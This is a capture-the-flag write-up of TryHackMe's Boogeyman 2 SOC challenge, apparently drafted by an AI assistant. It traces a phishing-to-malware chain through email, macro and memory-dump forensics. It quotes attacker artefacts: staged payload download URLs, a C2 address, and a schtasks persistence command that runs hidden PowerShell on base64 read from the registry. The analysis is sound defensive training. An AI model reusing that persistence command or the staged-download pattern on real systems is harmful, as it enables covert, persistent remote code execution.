markdown
# 🕵️ Boogeyman 2 - SOC Analyst Challenge Writeup

**Platform:** TryHackMe  
**Difficulty:** Medium-Hard  
**Path:** SOC Level 1 Capstone  
**Completion:** 100% (15/15 Questions)

---

## 📋 Challenge Overview

**Scenario:** After a previous compromise, Quick Logistics LLC thought they were safe. But the Boogeyman threat group has returned with more advanced TTPs (Tactics, Techniques, and Procedures). This time, they targeted **Maxine Beck**, an HR Specialist, through a spear-phishing email containing a malicious job application.

**Artefacts Provided:**
- Phishing email (.eml)
- Memory dump of compromised workstation (WKSTN-2961.raw)

**Tools Used:**
- `olevba` - VBA macro analysis
- `Volatility 3` - Memory forensics
- `strings` + `grep` - Basic string analysis

---

## 🎯 What I Did (Step-by-Step Investigation)

### Phase 1: Email Analysis (Questions 1-3)
```bash
# Extracted sender email from headers
cat "Resume - Application for Junior IT Analyst Role.eml" | grep -i "from:"
# Result: westaylor23@outlook.com

# Extracted victim email
cat "Resume - Application for Junior IT Analyst Role.eml" | grep -i "to:"
# Result: maxine.beck@quicklogisticsorg.onmicrosoft.com

# Extracted attachment using Python
python3 -c "
import email
with open('Resume - Application for Junior IT Analyst Role.eml', 'r') as f:
    msg = email.message_from_file(f)
for part in msg.walk():
    if part.get_content_disposition() == 'attachment':
        open(part.get_filename(), 'wb').write(part.get_payload(decode=True))
"
# Result: Resume_WesleyTaylor.doc
Phase 2: Document Forensics (Questions 4-5)
bash
# Analyzed macro with olevba
olevba Resume_WesleyTaylor.doc

# MD5 hash of malicious document
md5sum Resume_WesleyTaylor.doc
# Result: 52c4384a0b9e248b95804352ebec6c5b

# Found stage 2 payload URL in macro
# Result: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png
Phase 3: Memory Forensics (Questions 6-15)
bash
# Process listing to find malicious processes
vol -f WKSTN-2961.raw windows.pslist.PsList

# Network connections for C2 identification
vol -f WKSTN-2961.raw windows.netscan.NetScan | grep "updater"

# Command line arguments
vol -f WKSTN-2961.raw windows.cmdline.CmdLine | grep "6216"

# Found URLs in memory
strings WKSTN-2961.raw | grep "files.boogeymanisback.lol"

# Found persistence mechanism
strings WKSTN-2961.raw | grep -i "schtasks /create"
😤 What I Struggled With
The "Overcomplication Trap"
Problem: When looking for the URL used to download the malicious binary (Question 10), I immediately jumped to complex Volatility plugins:

❌ What I tried (and failed):

bash
vol -f WKSTN-2961.raw windows.vadinfo.VadInfo --pid 4260
vol -f WKSTN-2961.raw windows.memmap.Memmap --pid 4260 --dump
vol -f WKSTN-2961.raw windows.dumpfiles.DumpFiles --pid 4260
vol -f WKSTN-2961.raw yarascan.YaraScan --pid 4260
Why it failed: I was looking for "updater.exe" in the URL when the actual URL contained "update.exe". I also assumed I needed advanced memory forensics when the URL was stored as plaintext.

Analysis Paralysis
Spent 20+ minutes trying different complex commands when the answer was one simple grep away.

💡 What I Improved
The "Start Simple" Mindset
After struggling with Question 10, I adopted a new approach for the remaining questions:

✅ The New Formula:

Start with strings + grep on the raw memory dump
Use basic Volatility plugins (pslist, netscan, cmdline)
Only escalate to complex plugins if simple approaches fail
Results: Questions 11-15 were solved in under 10 minutes total.

Example of Improvement:
bash
# ❌ Before (Complex)
vol -f WKSTN-2961.raw windows.vadinfo.VadInfo --pid 4260 | strings | grep -i "128.199"

# ✅ After (Simple)
strings WKSTN-2961.raw | grep "files.boogeymanisback.lol"
# Found: var url = "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe"
🔍 Complete Attack Chain
1. INITIAL ACCESS
   └─ Phishing Email: westaylor23@outlook.com → maxine.beck@quicklogisticsorg.onmicrosoft.com
   └─ Attachment: Resume_WesleyTaylor.doc [MD5: 52c4384a0b9e248b95804352ebec6c5b]
   └─ Location: C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\

2. EXECUTION
   └─ AutoOpen macro triggered in WINWORD.EXE (PID 1124)
   └─ Macro downloads: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png
   └─ Saved as: C:\ProgramData\update.js

3. PAYLOAD DELIVERY
   └─ wscript.exe (PID 4260) executes update.js
   └─ Downloads: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe
   └─ Saved as: C:\Windows\Tasks\updater.exe

4. C2 COMMUNICATION
   └─ updater.exe (PID 6216) connects to: 128.199.95.189:8080

5. PERSISTENCE
   └─ Scheduled task created via schtasks:
   └─ Command: schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'powershell.exe -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"'
   └─ Registry storage: HKCU:\Software\Microsoft\Windows\CurrentVersion\debug
🛡️ Indicators of Compromise (IOCs)
Type	Indicator
Sender Email	westaylor23@outlook.com
Victim Email	maxine.beck@quicklogisticsorg.onmicrosoft.com
Malicious Document	Resume_WesleyTaylor.doc
MD5 Hash	52c4384a0b9e248b95804352ebec6c5b
Stage 2 URL	https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png
Binary URL	https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe
C2 IP:Port	128.199.95.189:8080
Malicious Process	updater.exe (PID 6216)
Process Path	C:\Windows\Tasks\updater.exe
Persistence	Scheduled Task "Updater"
🎓 Key Lessons Learned
For SOC Analysts:
Start Simple, Then Escalate - Don't reach for complex tools when strings | grep will do
Memory Dumps Contain Plain Text - URLs, commands, and filenames are often unencrypted in RAM
Process Tree Analysis - Always check parent-child relationships (PPID → PID)
Persistence Locations - Check C:\Windows\Tasks\, C:\ProgramData\, and Registry Run keys
For Malware Analysis:
OLE Documents - Use olevba to extract and deobfuscate macros quickly
Staged Payloads - Initial dropper → Stage 2 script → Final binary is a common pattern
Living Off the Land - wscript.exe, powershell.exe, and schtasks.exe are commonly abused
🏆 Challenge Statistics
Total Time: ~4.5 hours (including learning curve)
Questions Solved: 15/15 (100%)
Tools Mastered: olevba, Volatility 3, strings, grep
Key Breakthrough: Learning to start with simple commands before escalating complexity
🔗 References
TryHackMe Boogeyman 2 Room
Volatility 3 Documentation
Oletools Documentation
📝 Author Notes
This challenge was part of my SOC Level 1 training path. After completing 97% of the path, this capstone reinforced critical skills in phishing analysis, memory forensics, and attack chain reconstruction.

The biggest takeaway: Complex problems don't always require complex solutions. Sometimes the answer is hiding in plain text, and all you need is strings and grep.

Status: ✅ Completed
Confidence Level: High (for real-world SOC work)
Next Challenge: Continuing SOC Level 2 path

"The Boogeyman is back... but this time, I was ready."

---

This README showcases your:
- **Technical skills** (command examples, tool usage)
- **Growth mindset** (what you struggled with and improved)
- **Professional documentation** (clear formatting, IOCs, attack chain)
- **Personality** (honest about mistakes, celebratory tone)

Want me to adjust anything or add more sections?
